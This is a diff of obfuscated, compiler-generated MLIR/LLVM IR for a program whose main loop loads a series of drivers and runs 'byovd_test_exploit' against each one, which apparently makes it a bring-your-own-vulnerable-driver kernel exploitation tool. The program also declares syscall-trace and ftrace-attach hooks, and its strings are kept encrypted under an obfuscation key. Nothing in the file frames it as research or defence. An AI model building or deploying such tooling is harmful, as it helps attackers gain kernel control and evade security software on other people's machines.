-    llvm.call @exit(%arg0) : (i32) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_strlen(%arg0: !llvm.ptr) -> i64 {
-    %0 = llvm.call @strlen(%arg0) : (!llvm.ptr) -> i64
-    llvm.return %0 : i64
-  }
-  llvm.func internal @__obfs_wrap_memcpy(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i64) -> !llvm.ptr {
-    %0 = llvm.call @memcpy(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_memset(%arg0: !llvm.ptr, %arg1: i32, %arg2: i64) -> !llvm.ptr {
-    %0 = llvm.call @memset(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, i64) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_free(%arg0: !llvm.ptr) {
-    llvm.call @free(%arg0) : (!llvm.ptr) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_malloc(%arg0: i64) -> !llvm.ptr {
-    %0 = llvm.call @malloc(%arg0) : (i64) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_jocky_str_concat(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
-    %0 = llvm.call @jocky_str_concat(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_string(%arg0: i64) -> !llvm.ptr {
-    %0 = llvm.call @string(%arg0) : (i64) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_println(%arg0: !llvm.ptr) {
-    llvm.call @println(%arg0) : (!llvm.ptr) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_puts(%arg0: !llvm.ptr) -> i32 {
-    %0 = llvm.call @puts(%arg0) : (!llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
   llvm.mlir.global private unnamed_addr constant @__obfs_key("default_key") {addr_space = 0 : i32}
-  llvm.func @f_658275b5bcb4(%arg0: !llvm.ptr, %arg1: i64) -> !llvm.ptr attributes {sym_visibility = "private"} {
+  llvm.func @f_61ae7c24(%arg0: !llvm.ptr, %arg1: i64) -> !llvm.ptr attributes {sym_visibility = "private"} {
     %0 = llvm.mlir.constant(0 : i64) : i64
     %1 = llvm.mlir.constant(1 : i64) : i64
     %2 = llvm.mlir.constant(77 : i8) : i8
@@ -781,7 +261,7 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
   llvm.func @jocky_syscall_trace(i32) -> i32
   llvm.func @jocky_ftrace_attach(!llvm.ptr, !llvm.ptr) -> i32
   llvm.func @jocky_ftrace_detach(!llvm.ptr) -> i32
-  llvm.func @f_42fc974f80dc() -> i1 {
+  llvm.func @f_0218a827() -> i1 {
     %0 = llvm.mlir.constant(1 : i32) : i32
     %1 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
     %2 = llvm.mlir.constant(0 : i32) : i32
@@ -806,9 +286,9 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     %21 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
     %22 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
     %23 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<54 x i8>
-    llvm.call @__obfs_wrap_println(%23) : (!llvm.ptr) -> ()
+    llvm.call @println(%23) : (!llvm.ptr) -> ()
     %24 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
-    %25 = llvm.call @f_40b5962dd677(%24) : (!llvm.ptr) -> !llvm.ptr
+    %25 = llvm.call @f_f8b7e158(%24) : (!llvm.ptr) -> !llvm.ptr
     llvm.store %25, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     %26 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
     %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
@@ -816,22 +296,22 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     llvm.cond_br %28, ^bb1, ^bb4
   ^bb1:  // pred: ^bb0
     %29 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<42 x i8>
-    llvm.call @__obfs_wrap_println(%29) : (!llvm.ptr) -> ()
+    llvm.call @println(%29) : (!llvm.ptr) -> ()
     %30 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %31 = llvm.call @f_59bf8ee0007f(%30) : (!llvm.ptr) -> i1
+    %31 = llvm.call @f_b9127cd9(%30) : (!llvm.ptr) -> i1
     llvm.cond_br %31, ^bb2, ^bb3
   ^bb2:  // pred: ^bb1
     %32 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
-    llvm.call @__obfs_wrap_println(%32) : (!llvm.ptr) -> ()
+    llvm.call @println(%32) : (!llvm.ptr) -> ()
     llvm.store %18, %19 {alignment = 1 : i64} : i1, !llvm.ptr
     llvm.return %18 : i1
   ^bb3:  // pred: ^bb1
     llvm.br ^bb4
   ^bb4:  // 2 preds: ^bb0, ^bb3
     %33 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
-    llvm.call @__obfs_wrap_println(%33) : (!llvm.ptr) -> ()
+    llvm.call @println(%33) : (!llvm.ptr) -> ()
     %34 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
-    %35 = llvm.call @f_40b5962dd677(%34) : (!llvm.ptr) -> !llvm.ptr
+    %35 = llvm.call @f_f8b7e158(%34) : (!llvm.ptr) -> !llvm.ptr
     llvm.store %35, %22 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     %36 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
     %37 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
@@ -839,20 +319,20 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     llvm.cond_br %38, ^bb5, ^bb8
   ^bb5:  // pred: ^bb4
     %39 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
-    llvm.call @__obfs_wrap_println(%39) : (!llvm.ptr) -> ()
+    llvm.call @println(%39) : (!llvm.ptr) -> ()
     %40 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %41 = llvm.call @f_59bf8ee0007f(%40) : (!llvm.ptr) -> i1
+    %41 = llvm.call @f_b9127cd9(%40) : (!llvm.ptr) -> i1
     llvm.cond_br %41, ^bb6, ^bb7
   ^bb6:  // pred: ^bb5
     %42 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
-    llvm.call @__obfs_wrap_println(%42) : (!llvm.ptr) -> ()
+    llvm.call @println(%42) : (!llvm.ptr) -> ()
     llvm.store %18, %19 {alignment = 1 : i64} : i1, !llvm.ptr
     llvm.return %18 : i1
   ^bb7:  // pred: ^bb5
     llvm.br ^bb8
   ^bb8:  // 2 preds: ^bb4, ^bb7
     %43 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<62 x i8>
-    llvm.call @__obfs_wrap_println(%43) : (!llvm.ptr) -> ()
+    llvm.call @println(%43) : (!llvm.ptr) -> ()
     %44 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
     llvm.store %44, %11 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     %45 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
@@ -861,7 +341,7 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     llvm.store %46, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     llvm.return %16 : i1
   }
-  llvm.func @f_40b5962dd677(%arg0: !llvm.ptr) -> !llvm.ptr {
+  llvm.func @f_f8b7e158(%arg0: !llvm.ptr) -> !llvm.ptr {
     %0 = llvm.mlir.constant(1 : i32) : i32
     %1 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
     %2 = llvm.mlir.constant(0 : i32) : i32
@@ -870,12 +350,12 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     llvm.store %arg0, %4 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     %5 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
     %6 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %7 = llvm.call @__obfs_wrap_jocky_str_concat(%5, %6) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%7) : (!llvm.ptr) -> ()
+    %7 = llvm.call @jocky_str_concat(%5, %6) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%7) : (!llvm.ptr) -> ()
     %8 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
     llvm.return %8 : !llvm.ptr
   }
-  llvm.func @f_59bf8ee0007f(%arg0: !llvm.ptr) -> i1 {
+  llvm.func @f_b9127cd9(%arg0: !llvm.ptr) -> i1 {
     %0 = llvm.mlir.constant(1 : i32) : i32
     %1 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
     %2 = llvm.mlir.constant(0 : i32) : i32
@@ -895,7 +375,7 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     llvm.store %12, %7 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     llvm.return %8 : i1
   }
-  llvm.func @f_81f4df11aecf() -> i1 {
+  llvm.func @f_b610cf36() -> i1 {
     %0 = llvm.mlir.constant(1 : i32) : i32
     %1 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
     %2 = llvm.mlir.constant(0 : i32) : i32
@@ -913,54 +393,54 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     %14 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
     %15 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
     %16 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
-    llvm.call @__obfs_wrap_println(%16) : (!llvm.ptr) -> ()
+    llvm.call @println(%16) : (!llvm.ptr) -> ()
     %17 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    %18 = llvm.call @__obfs_wrap_fs_exists(%17) : (!llvm.ptr) -> i1
+    %18 = llvm.call @fs_exists(%17) : (!llvm.ptr) -> i1
     llvm.cond_br %18, ^bb1, ^bb2
   ^bb1:  // pred: ^bb0
     %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    %20 = llvm.call @__obfs_wrap_fs_file_size(%19) : (!llvm.ptr) -> i64
+    %20 = llvm.call @fs_file_size(%19) : (!llvm.ptr) -> i64
     llvm.store %20, %14 {alignment = 4 : i64} : i64, !llvm.ptr
     %21 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
     %22 = llvm.load %14 {alignment = 4 : i64} : !llvm.ptr -> i64
-    %23 = llvm.call @__obfs_wrap_string(%22) : (i64) -> !llvm.ptr
-    %24 = llvm.call @__obfs_wrap_jocky_str_concat(%21, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    %23 = llvm.call @string(%22) : (i64) -> !llvm.ptr
+    %24 = llvm.call @jocky_str_concat(%21, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
     %25 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
-    %26 = llvm.call @__obfs_wrap_jocky_str_concat(%24, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%26) : (!llvm.ptr) -> ()
+    %26 = llvm.call @jocky_str_concat(%24, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%26) : (!llvm.ptr) -> ()
     llvm.return %11 : i1
   ^bb2:  // pred: ^bb0
     %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<56 x i8>
-    llvm.call @__obfs_wrap_println(%27) : (!llvm.ptr) -> ()
+    llvm.call @println(%27) : (!llvm.ptr) -> ()
     %28 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
     %29 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
-    %30 = llvm.call @__obfs_wrap_jocky_str_concat(%28, %29) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    %30 = llvm.call @jocky_str_concat(%28, %29) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
     llvm.store %30, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     %31 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
     %32 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %33 = llvm.call @__obfs_wrap_jocky_str_concat(%31, %32) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%33) : (!llvm.ptr) -> ()
+    %33 = llvm.call @jocky_str_concat(%31, %32) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%33) : (!llvm.ptr) -> ()
     %34 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
-    llvm.call @__obfs_wrap_println(%34) : (!llvm.ptr) -> ()
+    llvm.call @println(%34) : (!llvm.ptr) -> ()
     %35 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
     llvm.store %35, %10 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     llvm.return %11 : i1
   }
-  llvm.func @f_8ec13d7c68d1() -> i1 {
+  llvm.func @f_97a724e0() -> i1 {
     %0 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
     %1 = llvm.mlir.constant(0 : i32) : i32
     %2 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
     %3 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
     %4 = llvm.mlir.constant(true) : i1
     %5 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
-    llvm.call @__obfs_wrap_println(%5) : (!llvm.ptr) -> ()
+    llvm.call @println(%5) : (!llvm.ptr) -> ()
     %6 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
     %7 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
-    %8 = llvm.call @__obfs_wrap_jocky_str_concat(%6, %7) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%8) : (!llvm.ptr) -> ()
+    %8 = llvm.call @jocky_str_concat(%6, %7) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%8) : (!llvm.ptr) -> ()
     llvm.return %4 : i1
   }
-  llvm.func @f_4837c8659494() -> i1 {
+  llvm.func @f_c1c92895() -> i1 {
     %0 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
     %1 = llvm.mlir.constant(0 : i32) : i32
     %2 = llvm.mlir.constant(false) : i1
@@ -973,11 +453,11 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     %9 = llvm.mlir.addressof @g_b7bfea9b : !llvm.ptr
     %10 = llvm.mlir.constant(true) : i1
     %11 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
-    %12 = llvm.call @__obfs_wrap_fs_exists(%11) : (!llvm.ptr) -> i1
+    %12 = llvm.call @fs_exists(%11) : (!llvm.ptr) -> i1
     llvm.cond_br %12, ^bb1, ^bb2
   ^bb1:  // pred: ^bb0
     %13 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
-    llvm.call @__obfs_wrap_println(%13) : (!llvm.ptr) -> ()
+    llvm.call @println(%13) : (!llvm.ptr) -> ()
     %14 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
     llvm.store %14, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
     %15 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
@@ -988,7 +468,7 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
   ^bb2:  // pred: ^bb0
     llvm.return %2 : i1
   }
-  llvm.func @f_20b3ef7cd0d6() -> i1 {
+  llvm.func @f_fe69c41f() -> i1 {
     %0 = llvm.mlir.constant(1 : i32) : i32
     %1 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
     %2 = llvm.mlir.constant(0 : i32) : i32
@@ -1014,19 +494,19 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     %22 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
     %23 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
     %24 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
-    llvm.call @__obfs_wrap_println(%24) : (!llvm.ptr) -> ()
+    llvm.call @println(%24) : (!llvm.ptr) -> ()
     %25 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
     %26 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %27 = llvm.call @__obfs_wrap_array_len(%26) : (!llvm.ptr) -> i64
-    %28 = llvm.call @__obfs_wrap_string(%27) : (i64) -> !llvm.ptr
-    %29 = llvm.call @__obfs_wrap_jocky_str_concat(%25, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%29) : (!llvm.ptr) -> ()
+    %27 = llvm.call @array_len(%26) : (!llvm.ptr) -> i64
+    %28 = llvm.call @string(%27) : (i64) -> !llvm.ptr
+    %29 = llvm.call @jocky_str_concat(%25, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%29) : (!llvm.ptr) -> ()
     %30 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%30) : (!llvm.ptr) -> ()
+    llvm.call @println(%30) : (!llvm.ptr) -> ()
     %31 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
     llvm.store %2, %31 {alignment = 4 : i64} : i32, !llvm.ptr
     %32 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %33 = llvm.call @__obfs_wrap_array_len(%32) : (!llvm.ptr) -> i64
+    %33 = llvm.call @array_len(%32) : (!llvm.ptr) -> i64
     %34 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
     llvm.store %6, %34 {alignment = 4 : i64} : i64, !llvm.ptr
     %35 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
@@ -1054,21 +534,21 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     %50 = llvm.load %31 {alignment = 4 : i64} : !llvm.ptr -> i32
     %51 = llvm.add %50, %0 : i32
     %52 = llvm.sext %51 : i32 to i64
-    %53 = llvm.call @__obfs_wrap_string(%52) : (i64) -> !llvm.ptr
-    %54 = llvm.call @__obfs_wrap_jocky_str_concat(%49, %53) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    %53 = llvm.call @string(%52) : (i64) -> !llvm.ptr
+    %54 = llvm.call @jocky_str_concat(%49, %53) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
     %55 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
-    %56 = llvm.call @__obfs_wrap_jocky_str_concat(%54, %55) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    %56 = llvm.call @jocky_str_concat(%54, %55) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
     %57 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %58 = llvm.call @__obfs_wrap_array_len(%57) : (!llvm.ptr) -> i64
-    %59 = llvm.call @__obfs_wrap_string(%58) : (i64) -> !llvm.ptr
-    %60 = llvm.call @__obfs_wrap_jocky_str_concat(%56, %59) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    %58 = llvm.call @array_len(%57) : (!llvm.ptr) -> i64
+    %59 = llvm.call @string(%58) : (i64) -> !llvm.ptr
+    %60 = llvm.call @jocky_str_concat(%56, %59) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
     %61 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<3 x i8>
-    %62 = llvm.call @__obfs_wrap_jocky_str_concat(%60, %61) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    %62 = llvm.call @jocky_str_concat(%60, %61) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
     %63 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %64 = llvm.call @__obfs_wrap_jocky_str_concat(%62, %63) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%64) : (!llvm.ptr) -> ()
+    %64 = llvm.call @jocky_str_concat(%62, %63) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%64) : (!llvm.ptr) -> ()
     %65 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %66 = llvm.call @__obfs_wrap_byovd_load_driver(%65) : (!llvm.ptr) -> i32
+    %66 = llvm.call @byovd_load_driver(%65) : (!llvm.ptr) -> i32
     llvm.store %66, %22 {alignment = 4 : i64} : i32, !llvm.ptr
     %67 = llvm.load %22 {alignment = 4 : i64} : !llvm.ptr -> i32
     %68 = llvm.icmp "sgt" %67, %2 : i32
@@ -1077,38 +557,38 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     %69 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
     %70 = llvm.load %22 {alignment = 4 : i64} : !llvm.ptr -> i32
     %71 = llvm.sext %70 : i32 to i64
-    %72 = llvm.call @__obfs_wrap_string(%71) : (i64) -> !llvm.ptr
-    %73 = llvm.call @__obfs_wrap_jocky_str_concat(%69, %72) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%73) : (!llvm.ptr) -> ()
+    %72 = llvm.call @string(%71) : (i64) -> !llvm.ptr
+    %73 = llvm.call @jocky_str_concat(%69, %72) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%73) : (!llvm.ptr) -> ()
     %74 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
     %75 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %76 = llvm.call @__obfs_wrap_jocky_str_concat(%74, %75) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%76) : (!llvm.ptr) -> ()
+    %76 = llvm.call @jocky_str_concat(%74, %75) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%76) : (!llvm.ptr) -> ()
     %77 = llvm.load %22 {alignment = 4 : i64} : !llvm.ptr -> i32
-    %78 = llvm.call @__obfs_wrap_byovd_test_exploit(%77) : (i32) -> i32
+    %78 = llvm.call @byovd_test_exploit(%77) : (i32) -> i32
     llvm.store %78, %23 {alignment = 4 : i64} : i32, !llvm.ptr
     %79 = llvm.load %23 {alignment = 4 : i64} : !llvm.ptr -> i32
     %80 = llvm.icmp "eq" %79, %2 : i32
     llvm.cond_br %80, ^bb4, ^bb5
   ^bb4:  // pred: ^bb3
     %81 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<52 x i8>
-    llvm.call @__obfs_wrap_println(%81) : (!llvm.ptr) -> ()
+    llvm.call @println(%81) : (!llvm.ptr) -> ()
     %82 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%82) : (!llvm.ptr) -> ()
+    llvm.call @println(%82) : (!llvm.ptr) -> ()
     %83 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
     %84 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
-    %85 = llvm.call @__obfs_wrap_jocky_str_concat(%83, %84) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%85) : (!llvm.ptr) -> ()
+    %85 = llvm.call @jocky_str_concat(%83, %84) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%85) : (!llvm.ptr) -> ()
     llvm.return %19 : i1
   ^bb5:  // pred: ^bb3
     %86 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<50 x i8>
-    llvm.call @__obfs_wrap_println(%86) : (!llvm.ptr) -> ()
+    llvm.call @println(%86) : (!llvm.ptr) -> ()
     llvm.br ^bb6
   ^bb6:  // pred: ^bb5
     llvm.br ^bb8
   ^bb7:  // pred: ^bb2
     %87 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
-    llvm.call @__obfs_wrap_println(%87) : (!llvm.ptr) -> ()
+    llvm.call @println(%87) : (!llvm.ptr) -> ()
     llvm.br ^bb8
   ^bb8:  // 2 preds: ^bb6, ^bb7
     %88 = llvm.load %31 {alignment = 4 : i64} : !llvm.ptr -> i32
@@ -1121,9 +601,9 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     llvm.br ^bb1
   ^bb10:  // pred: ^bb1
     %91 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%91) : (!llvm.ptr) -> ()
+    llvm.call @println(%91) : (!llvm.ptr) -> ()
     %92 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
-    llvm.call @__obfs_wrap_println(%92) : (!llvm.ptr) -> ()
+    llvm.call @println(%92) : (!llvm.ptr) -> ()
     llvm.return %8 : i1
   }
   llvm.func @main() {
@@ -1157,307 +637,307 @@ module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4
     %27 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
     %28 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
     %29 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
-    llvm.call @__obfs_wrap_println(%29) : (!llvm.ptr) -> ()
+    llvm.call @println(%29) : (!llvm.ptr) -> ()
     %30 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
     %31 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
